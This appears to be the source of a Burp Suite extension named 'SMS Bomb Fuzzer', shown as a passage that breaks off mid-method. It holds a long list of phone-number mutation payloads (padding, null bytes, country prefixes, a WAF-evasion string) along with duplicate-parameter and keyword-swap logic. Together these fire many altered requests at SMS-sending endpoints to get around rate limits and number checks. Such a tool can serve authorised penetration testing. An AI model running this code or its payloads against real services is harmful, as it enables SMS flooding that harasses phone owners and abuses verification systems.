package burp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    // UI组件
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private JTable originalTable; // 显示原始请求日志
    private JTable resultTable;   // 显示测试结果

    // 日志记录
    private List<OriginalLogEntry> originalLog = new ArrayList<>();
    private List<TestLogEntry> testLog = new ArrayList<>();

    // 控制面板组件
    private JButton clearListButton;
    private JButton whiteListButton;
    private JTextField whiteListField;

    // 自定义号码输入与修改按钮
    private JTextField customPhoneField;
    private JButton modifyPhoneButton;
    // 默认测试号码
    private String customPhoneNumber = "18888888888";

    // 短信接口测试按钮和组合测试按钮
    private JButton smsInterfaceTestButton;
    private JButton combineTestButton;
    // 状态变量：短信接口测试和组合测试是否启用
    private boolean smsInterfaceTestEnabled = false;
    private boolean combineTestEnabled = false;

    // 当前选中的原始请求，用于请求/响应查看器展示
    private IHttpRequestResponse currentlyDisplayedItem;
    private int selectedOriginalId = -1;

    // 日志编号计数器
    private int originalCounter = 0;
    private int testCounter = 0;
    public PrintWriter stdout;

    // 白名单设置：用户填写的域名列表（用逗号分隔）以及白名单开关
    private boolean whiteListEnabled = false;
    private String whiteListDomains = "";


    // 定义测试payload的模板数组（模板中出现"xxxxxxxxxxx"的部分会被替换成实际的11位数字）
    private static final String[] PAYLOAD_PATTERNS = new String[] {
            "xxxxxxxxxxx,",
            "xxxxxxxxxxx,,",
            "xxxxxxxxxxx,,,",
            "xxxxxxxxxxx,,,,",
            "xxxxxxxxxxx,,,,,",
            ",,,,,xxxxxxxxxxx",
            ",,,,xxxxxxxxxxx",
            ",,,xxxxxxxxxxx",
            ",,xxxxxxxxxxx",
            ",xxxxxxxxxxx",
            " xxxxxxxxxxx",
            "  xxxxxxxxxxx",
            "   xxxxxxxxxxx",
            "%20xxxxxxxxxxx",
            "%20%20xxxxxxxxxxx",
            "%20%20%20xxxxxxxxxxx",
            "xxxxxxxxxxx ",
            "xxxxxxxxxxx  ",
            "xxxxxxxxxxx   ",
            "xxxxxxxxxxx%20",
            "xxxxxxxxxxx%20%20",
            "xxxxxxxxxxx%20%20%20",
            "@xxxxxxxxxxx",
            "@@xxxxxxxxxxx",
            "@@@xxxxxxxxxxx",
            "xxxxxxxxxxx@",
            "xxxxxxxxxxx@@",
            "xxxxxxxxxxx@@@",
            "%00xxxxxxxxxxx",
            "%00%00xxxxxxxxxxx",
            "%00%00%00xxxxxxxxxxx",
            "xxxxxxxxxxx%00",
            "xxxxxxxxxxx%00%00",
            "xxxxxxxxxxx%00%00%00",
            "xxxxxxxxxxx\\n",
            "xxxxxxxxxxx\\n\\n",
            "xxxxxxxxxxx\\n\\n\\n",
            "xxxxxxxxxxx\\n\\n\\n\\n",
            "\\nxxxxxxxxxxx",
            "\\n\\nxxxxxxxxxxx",
            "\\n\\n\\nxxxxxxxxxxx",
            "\\n\\n\\n\\nxxxxxxxxxxx",
            "xxxxxxxxxxx\\r",
            "xxxxxxxxxxx\\r\\r",
            "xxxxxxxxxxx\\r\\r\\r",
            "xxxxxxxxxxx\\r\\r\\r\\r",
            "\\rxxxxxxxxxxx",
            "\\r\\rxxxxxxxxxxx",
            "\\r\\r\\rxxxxxxxxxxx",
            "\\r\\r\\r\\rxxxxxxxxxxx",
            "xxxxxxxxxxx+",
            "xxxxxxxxxxx++",
            "xxxxxxxxxxx+++",
            "xxxxxxxxxxx++++",
            "+xxxxxxxxxxx",
            "++xxxxxxxxxxx",
            "+++xxxxxxxxxxx",
            "++++xxxxxxxxxxx",
            "xxxxxxxxxxx-",
            "xxxxxxxxxxx--",
            "xxxxxxxxxxx---",
            "xxxxxxxxxxx----",
            "-xxxxxxxxxxx",
            "--xxxxxxxxxxx",
            "---xxxxxxxxxxx",
            "----xxxxxxxxxxx",
            "xxxxxxxxxxx*",
            "xxxxxxxxxxx**",
            "xxxxxxxxxxx***",
            "xxxxxxxxxxx****",
            "*xxxxxxxxxxx",
            "**xxxxxxxxxxx",
            "***xxxxxxxxxxx",
            "****xxxxxxxxxxx",
            "xxxxxxxxxxx/",
            "xxxxxxxxxxx//",
            "xxxxxxxxxxx///",
            "xxxxxxxxxxx////",
            "/xxxxxxxxxxx",
            "//xxxxxxxxxxx",
            "///xxxxxxxxxxx",
            "////xxxxxxxxxxx",
            "+86xxxxxxxxxxx",
            "+86 xxxxxxxxxxx",
            "+86%20xxxxxxxxxxx",
            "+12xxxxxxxxxxx",
            "+12 xxxxxxxxxxx",
            "+12%20xxxxxxxxxxx",
            "+852xxxxxxxxxxx",
            "+852 xxxxxxxxxxx",
            "+852%20xxxxxxxxxxx",
            "+853xxxxxxxxxxx",
            "+853 xxxxxxxxxxx",
            "+853%20xxxxxxxxxxx",
            "0086xxxxxxxxxxx",
            "0086 xxxxxxxxxxx",
            "0086%20xxxxxxxxxxx",
            "0012xxxxxxxxxxx",
            "0012 xxxxxxxxxxx",
            "0012%20xxxxxxxxxxx",
            "00852xxxxxxxxxxx",
            "00852 xxxxxxxxxxx",
            "00852%20xxxxxxxxxxx",
            "00853xxxxxxxxxxx",
            "00853 xxxxxxxxxxx",
            "00853%20xxxxxxxxxxx",
            "9986xxxxxxxxxxx",
            "9986 xxxxxxxxxxx",
            "9986%20xxxxxxxxxxx",
            "9912xxxxxxxxxxx",
            "9912 xxxxxxxxxxx",
            "9912%20xxxxxxxxxxx",
            "99852xxxxxxxxxxx",
            "99852 xxxxxxxxxxx",
            "99852%20xxxxxxxxxxx",
            "99853xxxxxxxxxxx",
            "99853 xxxxxxxxxxx",
            "99853%20xxxxxxxxxxx",
            "86xxxxxxxxxxx",
            "86 xxxxxxxxxxx",
            "86%20xxxxxxxxxxx",
            "12xxxxxxxxxxx",
            "12 xxxxxxxxxxx",
            "12%20xxxxxxxxxxx",
            "852xxxxxxxxxxx",
            "852 xxxxxxxxxxx",
            "852%20xxxxxxxxxxx",
            "853xxxxxxxxxxx",
            "853 xxxxxxxxxxx",
            "853%20xxxxxxxxxxx",
            "086xxxxxxxxxxx",
            "086 xxxxxxxxxxx",
            "086%20xxxxxxxxxxx",
            "012xxxxxxxxxxx",
            "012 xxxxxxxxxxx",
            "012%20xxxxxxxxxxx",
            "0852xxxxxxxxxxx",
            "0852 xxxxxxxxxxx",
            "0852%20xxxxxxxxxxx",
            "0853xxxxxxxxxxx",
            "0853 xxxxxxxxxxx",
            "0853%20xxxxxxxxxxx",
            "%86xxxxxxxxxxx",
            "%86 xxxxxxxxxxx",
            "%86%2%xxxxxxxxxxx",
            "%12xxxxxxxxxxx",
            "%12 xxxxxxxxxxx",
            "%12%2%xxxxxxxxxxx",
            "%852xxxxxxxxxxx",
            "%852 xxxxxxxxxxx",
            "%852%2%xxxxxxxxxxx",
            "%853xxxxxxxxxxx",
            "%853 xxxxxxxxxxx",
            "%853%2%xxxxxxxxxxx",
            " 0xxxxxxxxxxx",
            "%200xxxxxxxxxxx",
            "0xxxxxxxxxxx",
            "00xxxxxxxxxxx",
            "000xxxxxxxxxxx",
            "0000xxxxxxxxxxx",
            "00000xxxxxxxxxxx",
            "+)WAFXR#!Txxxxxxxxxxx",
            "xxxxxxxxxxx+)WAFXR#!T",
            "xxxxxxxxxxx.0",
            "xxxxxxxxxxx.1",
            "xxxxxxxxxxx.2",
            "xxxxxxxxxxx.3",
            "xxxxxxxxxxx,18888888888",
            "xxxxxxxxxxx,,18888888888",
            "xxxxxxxxxxx,,,18888888888",
            "xxxxxxxxxxx&18888888888",
            "xxxxxxxxxxx&&18888888888",
            "xxxxxxxxxxx&&&18888888888",
            "xxxxxxxxxxx&&&&18888888888",
    };

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        // 输出
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stdout.println("[+] ####################################");
        this.stdout.println("[+] SMS Bomb Fuzzer!");
        this.stdout.println("[+] version:1.0");
        this.stdout.println("[+] author：昱子");
        this.stdout.println("[+] Blog：https://blog.yuzisec.xyz");
        this.stdout.println("[+] Github：https://github.com/yuziiiiiiiiii/SMS_Bomb_Fuzzer");
        this.stdout.println("[+] ####################################");
        this.stdout.println("[+] Enjoy it~");
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("SMS Bomb Fuzzer");

        // 构建UI（在Swing线程中执行）
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                // 创建请求/响应查看器
                requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);

                // 创建日志表格
                originalTable = new JTable(BurpExtender.this);
                resultTable = new JTable(new ResultTableModel());

                // 原始日志表格选择时更新测试结果表和请求/响应查看器
                originalTable.getSelectionModel().addListSelectionListener(e -> {
                    int selectedRow = originalTable.getSelectedRow();
                    if (selectedRow >= 0 && selectedRow < originalLog.size()) {
                        selectedOriginalId = originalLog.get(selectedRow).id;
                        ((ResultTableModel)resultTable.getModel()).setFilter(selectedOriginalId);
                        OriginalLogEntry entry = originalLog.get(selectedRow);
                        requestViewer.setMessage(entry.requestResponse.getRequest(), true);
                        responseViewer.setMessage(entry.requestResponse.getResponse(), false);
                        currentlyDisplayedItem = entry.requestResponse;
                    }
                });

                // 测试结果表格选择时更新请求/响应查看器
                resultTable.getSelectionModel().addListSelectionListener(e -> {
                    int selectedRow = resultTable.getSelectedRow();
                    List<TestLogEntry> filtered = getFilteredTestLog();
                    if (selectedRow >= 0 && selectedRow < filtered.size()) {
                        TestLogEntry entry = filtered.get(selectedRow);
                        requestViewer.setMessage(entry.requestResponse.getRequest(), true);
                        responseViewer.setMessage(entry.requestResponse.getResponse(), false);
                        currentlyDisplayedItem = entry.requestResponse;
                    }
                });

                // 构建展示信息面板
                JPanel headerPanel = new JPanel(new GridLayout(4, 1));
                headerPanel.add(new JLabel("名称：SMS Bomb Fuzzer"));
                headerPanel.add(new JLabel("博客：https://blog.yuzisec.xyz"));
                headerPanel.add(new JLabel("作者：昱子"));
                headerPanel.add(new JLabel("Github：https://github.com/yuziiiiiiiiii/SMS_Bomb_Fuzzer"));
                headerPanel.add(new JLabel("版本：V1.0"));

                // 构建控制面板

                clearListButton = new JButton("清空列表");
                clearListButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        originalLog.clear();
                        testLog.clear();
                        originalCounter = 0;
                        testCounter = 0;
                        fireTableDataChanged();
                        ((ResultTableModel)resultTable.getModel()).fireTableDataChanged();
                    }
                });

                whiteListButton = new JButton("启动白名单");
                whiteListButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        if (whiteListEnabled) {
                            whiteListEnabled = false;
                            whiteListButton.setText("启动白名单");
                            whiteListField.setEditable(true);
                            whiteListField.setForeground(Color.BLACK);
                        } else {
                            whiteListEnabled = true;
                            whiteListButton.setText("关闭白名单");
                            whiteListDomains = whiteListField.getText();
                            whiteListField.setEditable(false);
                            whiteListField.setForeground(Color.GRAY);
                        }
                    }
                });

                whiteListField = new JTextField("填写白名单域名", 20);

                // 自定义号码输入框和修改按钮
                customPhoneField = new JTextField("18888888888", 20);
                modifyPhoneButton = new JButton("修改测试number");
                modifyPhoneButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        String input = customPhoneField.getText().trim();
                        if (!input.isEmpty()) {
                            customPhoneNumber = input;
                        } else {
                            customPhoneNumber = "18888888888";
                        }
                        callbacks.printOutput("自定义测试号码更新为：" + customPhoneNumber);
                    }
                });

                // 测试短信接口按钮
                smsInterfaceTestButton = new JButton("测试短信接口");
                smsInterfaceTestButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        smsInterfaceTestEnabled = !smsInterfaceTestEnabled;
                        smsInterfaceTestButton.setText(smsInterfaceTestEnabled ? "关闭短信接口测试" : "测试短信接口");
                        callbacks.printOutput("短信接口测试 " + (smsInterfaceTestEnabled ? "启用" : "关闭"));
                    }
                });

                // 组合测试按钮
                combineTestButton = new JButton("组合测试");
                combineTestButton.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        combineTestEnabled = !combineTestEnabled;
                        combineTestButton.setText(combineTestEnabled ? "关闭组合测试" : "组合测试");
                        callbacks.printOutput("组合测试 " + (combineTestEnabled ? "启用" : "关闭"));
                    }
                });

                JPanel controlPanel = new JPanel();
                controlPanel.setLayout(new BoxLayout(controlPanel, BoxLayout.Y_AXIS));

                // 第一行：其他按钮，水平排列（靠左）
                JPanel firstRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
                firstRow.add(clearListButton);
                firstRow.add(whiteListField);
                firstRow.add(whiteListButton);
                firstRow.add(customPhoneField);
                firstRow.add(modifyPhoneButton);
                controlPanel.add(firstRow);

                // 第二行："测试短信接口"和"组合测试"，水平居中排列
                JPanel secondRow = new JPanel(new FlowLayout(FlowLayout.CENTER));
                secondRow.add(smsInterfaceTestButton);
                secondRow.add(combineTestButton);
                controlPanel.add(secondRow);



                // 将展示信息面板和控制面板组合
                JPanel topPanel = new JPanel();
                topPanel.setLayout(new BoxLayout(topPanel, BoxLayout.Y_AXIS));
                topPanel.add(headerPanel);
                topPanel.add(controlPanel);

                // 构建日志表格面板（上部：原始请求，下部：测试结果）
                JSplitPane tableSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                JScrollPane originalScrollPane = new JScrollPane(originalTable);
                JScrollPane resultScrollPane = new JScrollPane(resultTable);
                tableSplitPane.setTopComponent(originalScrollPane);
                tableSplitPane.setBottomComponent(resultScrollPane);
                tableSplitPane.setDividerLocation(200);

                // 请求/响应查看器标签页
                JTabbedPane viewerTabs = new JTabbedPane();
                viewerTabs.addTab("Request", requestViewer.getComponent());
                viewerTabs.addTab("Response", responseViewer.getComponent());

                // 右侧面板：展示信息+控制面板 + 查看器
                JPanel rightPanel = new JPanel(new BorderLayout());
                rightPanel.add(topPanel, BorderLayout.NORTH);
                rightPanel.add(viewerTabs, BorderLayout.CENTER);

                // 主面板：左侧为日志表格，右侧为右侧面板
                splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, tableSplitPane, rightPanel);
                splitPane.setDividerLocation(600);

                callbacks.customizeUiComponent(splitPane);
                callbacks.addSuiteTab(BurpExtender.this);
            }
        });

        // 注册右键菜单扩展
        callbacks.registerContextMenuFactory(this);
    }

    // ITab接口方法
    @Override
    public String getTabCaption() {
        return "SMS Bomb Fuzzer";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    // IMessageEditorController接口方法
    @Override
    public byte[] getRequest() {
        return (currentlyDisplayedItem != null) ? currentlyDisplayedItem.getRequest() : null;
    }

    @Override
    public byte[] getResponse() {
        return (currentlyDisplayedItem != null) ? currentlyDisplayedItem.getResponse() : null;
    }

    @Override
    public IHttpService getHttpService() {
        return (currentlyDisplayedItem != null) ? currentlyDisplayedItem.getHttpService() : null;
    }

    // IContextMenuFactory接口方法，添加右键菜单“Send to SMS Bomb Fuzzer”
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();
        final IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();
        if (selectedMessages != null && selectedMessages.length > 0) {
            JMenuItem menuItem = new JMenuItem("Send to SMS Bomb Fuzzer");
            menuItem.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    new Thread(new Runnable() {
                        public void run() {
                            checkPayloads(selectedMessages[0]);
                        }
                    }).start();
                }
            });
            menuItems.add(menuItem);
        }
        return menuItems;
    }

    /**
     * 核心方法：对传入的请求进行处理
     * 1、先判断白名单（如果启用）
     * 2、记录原始请求
     * 3、遍历请求参数，对于任一参数满足值正好为11位数字（无论数字型或字符型）的条件，生成一系列测试payload，
     *    对于普通参数直接构造新请求；对于JSON格式则递归解析、修改后构造新请求
     * 4、发送测试请求，记录响应时间、响应包长度和状态码，将测试结果写入日志
     * 5、如果至少有一次测试执行，则更新原始请求状态为“测试完毕”
     */
    private void checkPayloads(IHttpRequestResponse baseRequestResponse) {
        // 白名单过滤
        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        String urlStr = url.toString();
        if (whiteListEnabled) {
            boolean allowed = false;
            String[] domains = whiteListDomains.split(",");
            for (String domain : domains) {
                if (urlStr.contains(domain.trim())) {
                    allowed = true;
                    break;
                }
            }
            if (allowed) {
                callbacks.printOutput("停止测试，由于请求URL在白名单内：" + urlStr);
                return;
            }
        }

        // 保存原始请求（调用saveBuffersToTempFiles确保保存副本）
        IHttpRequestResponsePersisted persistedOriginal = callbacks.saveBuffersToTempFiles(baseRequestResponse);
        OriginalLogEntry origEntry = new OriginalLogEntry(originalCounter++, baseRequestResponse.getHttpService(), url, persistedOriginal, "测试中或数据包格式不合法或数据包无number");
        originalLog.add(origEntry);
        fireTableDataChanged();

        // 分析请求
        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
        List<IParameter> parameters = requestInfo.getParameters();

        boolean testExecuted = false; // 标志是否至少执行一次测试

        // 遍历GET、POST、Cookie参数
        for (IParameter param : parameters) {
            int type = param.getType();
            if (type == IParameter.PARAM_URL || type == IParameter.PARAM_BODY || type == IParameter.PARAM_COOKIE) {
                String value = String.valueOf(param.getValue());
                if (value != null) {
                    // 1. 如果是11位数字（手机号）则进行payload测试
                    if (value.matches("^\\d{11}$")) {
                        testExecuted = true;
                        // 正常的payload测试
                        for (String pattern : PAYLOAD_PATTERNS) {
                            String payload = pattern.replace("xxxxxxxxxxx", value);
                            if(payload.contains("18888888888")){
                                payload = payload.replace("18888888888", customPhoneNumber);
                            }
                            IParameter newParam = helpers.buildParameter(param.getName(), payload, (byte) type);
                            byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
                            IHttpService httpService = baseRequestResponse.getHttpService();
                            long start = System.currentTimeMillis();
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                            long end = System.currentTimeMillis();
                            int timeTaken = (int)(end - start);
                            int responseLength = 0;
                            int responseCode = 0;
                            if (testResponse.getResponse() != null) {
                                responseLength = testResponse.getResponse().length;
                                responseCode = helpers.analyzeResponse(testResponse.getResponse()).getStatusCode();
                            }
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName(), payload, responseLength, timeTaken, responseCode, persistedTest);
                            testLog.add(testEntry);
                            ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                        }
                        // duplicate参数测试：在请求体中追加同名参数，值为自定义号码
                        if (combineTestEnabled) {
                            byte[] req = baseRequestResponse.getRequest();
                            IRequestInfo reqInfo = helpers.analyzeRequest(req);
                            int bodyOffset = reqInfo.getBodyOffset();
                            String body = (bodyOffset < req.length) ? helpers.bytesToString(Arrays.copyOfRange(req, bodyOffset, req.length)) : "";
                            // 简单处理：在现有body后追加参数
                            String newBody = body + "&" + param.getName() + "=" + customPhoneNumber;
                            byte[] newRequest = helpers.buildHttpMessage(reqInfo.getHeaders(), newBody.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_dup", customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                        }
                    }
                    // 2. 如果短信接口测试启用，并且参数值为特定关键字，则进行替换测试
                    if (smsInterfaceTestEnabled && isSmsKeyword(value)) {
                        testExecuted = true;
                        String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
                        for (String kw : keywords) {
                            if (!kw.equalsIgnoreCase(value)) {
                                IParameter newParam = helpers.buildParameter(param.getName(), kw, (byte) type);
                                byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
                                IHttpService httpService = baseRequestResponse.getHttpService();
                                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_sms", kw, responseLength, 0, responseCode, persistedTest);
                                testLog.add(testEntry);
                                ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                            }
                        }
                    }
                    // 3. 如果短信接口测试启用，并且参数值为整数且在-100到100范围内，则进行整数替换测试
                    if (smsInterfaceTestEnabled && isInteger(value) && isInRange(value)) {
                        testExecuted = true;
                        int origInt = Integer.parseInt(value);
                        for (int i = -100; i <= 100; i++) {
                            if (i != origInt) {
                                IParameter newParam = helpers.buildParameter(param.getName(), String.valueOf(i), (byte) type);
                                byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
                                IHttpService httpService = baseRequestResponse.getHttpService();
                                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_int", String.valueOf(i), responseLength, 0, responseCode, persistedTest);
                                testLog.add(testEntry);
                                ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                            }
                        }
                    }
                    // 4. 如果启用了组合测试，对手机号参数进行排列组合测试（例如：同时替换payload和追加duplicate参数）
                    if (combineTestEnabled && value.matches("^\\d{11}$")) {
                        testExecuted = true;
                        for (String pattern : PAYLOAD_PATTERNS) {
                            String payload = pattern.replace("xxxxxxxxxxx", value);
                            if(payload.contains("18888888888")){
                                payload = payload.replace("18888888888", customPhoneNumber);
                            }
                            // 先更新参数
                            byte[] modifiedRequest = helpers.updateParameter(baseRequestResponse.getRequest(), helpers.buildParameter(param.getName(), payload, (byte) type));
                            IRequestInfo reqInfo = helpers.analyzeRequest(modifiedRequest);
                            int bodyOffset = reqInfo.getBodyOffset();
                            String body = (bodyOffset < modifiedRequest.length) ? helpers.bytesToString(Arrays.copyOfRange(modifiedRequest, bodyOffset, modifiedRequest.length)) : "";
                            // 在请求体中追加 duplicate 参数
                            String newBody = body + "&" + param.getName() + "=" + customPhoneNumber;
                            byte[] newRequest = helpers.buildHttpMessage(reqInfo.getHeaders(), newBody.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_combo", payload + " + dup:" + customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                        }
                    }
                }
            }
        }

        // 判断是否为JSON格式请求（通过Content-Type判断）
        List<String> headers = requestInfo.getHeaders();
        boolean isJson = false;
        for (String header : headers) {
            if (header.toLowerCase().contains("application/json")) {
                isJson = true;
                break;
            }
        }
        if (isJson) {
            byte[] req = baseRequestResponse.getRequest();
            int bodyOffset = requestInfo.getBodyOffset();
            String body = helpers.bytesToString(Arrays.copyOfRange(req, bodyOffset, req.length)).trim();

            try {
                Object json = parseJson(body);
                // 递归处理JSON，若有字段满足条件则返回true
                boolean jsonExecuted = processJsonAndTest(json, baseRequestResponse, headers, origEntry);
                testExecuted |= jsonExecuted;
            } catch (Exception ex) {
                callbacks.printOutput("JSON解析失败: " + ex.getMessage());
            }
        }

        if (testExecuted) {
            origEntry.state = "测试完毕";
            fireTableDataChanged();
        }
    }

    /**
     * 递归处理JSONObject和JSONArray，查找值为11位数字、特定关键字或整数的字段，并进行测试
     * 返回true表示至少执行了一次测试请求
     */
    private boolean processJsonAndTest(Object json, IHttpRequestResponse baseRequestResponse, List<String> headers, OriginalLogEntry origEntry) {
        boolean executed = false;
        if (json instanceof JSONObject) {
            JSONObject obj = (JSONObject) json;
            Iterator<String> keys = obj.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                Object valueObj = obj.get(key);
                if (valueObj instanceof String || valueObj instanceof Number) {
                    String str = valueObj.toString();
                    // 手机号测试：11位数字
                    if (str.matches("^\\d{11}$")) {
                        executed = true;
                        for (String pattern : PAYLOAD_PATTERNS) {
                            String payload = pattern.replace("xxxxxxxxxxx", str);
                            if(payload.contains("18888888888")){
                                payload = payload.replace("18888888888", customPhoneNumber);
                            }
                            JSONObject newObj = new JSONObject(obj.toString());
                            newObj.put(key, payload);
                            byte[] bodyBytes = newObj.toString().getBytes(StandardCharsets.UTF_8);
                            byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, key, payload, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                        }
                        // JSON duplicate测试：增加新的相同名字的参数（通过自定义方法构造重复key的JSON字符串）
                        if (combineTestEnabled) {
                            String dupJson = addDuplicateParameterToJson(obj, key, customPhoneNumber);
                            byte[] bodyBytes = dupJson.getBytes(StandardCharsets.UTF_8);
                            byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, key + "_dup", customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                        }
                    }
                    // 关键字测试：短信接口关键字替换
                    if (smsInterfaceTestEnabled && isSmsKeyword(str)) {
                        executed = true;
                        String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
                        for (String kw : keywords) {
                            if (!kw.equalsIgnoreCase(str)) {
                                JSONObject newObj = new JSONObject(obj.toString());
                                newObj.put(key, kw);
                                byte[] bodyBytes = newObj.toString().getBytes(StandardCharsets.UTF_8);
                                byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, key + "_sms", kw, responseLength, 0, responseCode, persistedTest);
                                testLog.add(testEntry);
                                ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                            }
                        }
                    }
                    // 整数测试：如果参数为整数且在-100到100之间，则生成替换测试
                    if (smsInterfaceTestEnabled && isInteger(str) && isInRange(str)) {
                        executed = true;
                        int origInt = Integer.parseInt(str);
                        for (int i = -100; i <= 100; i++) {
                            if (i != origInt) {
                                JSONObject newObj = new JSONObject(obj.toString());
                                newObj.put(key, String.valueOf(i));
                                byte[] bodyBytes = newObj.toString().getBytes(StandardCharsets.UTF_8);
                                byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
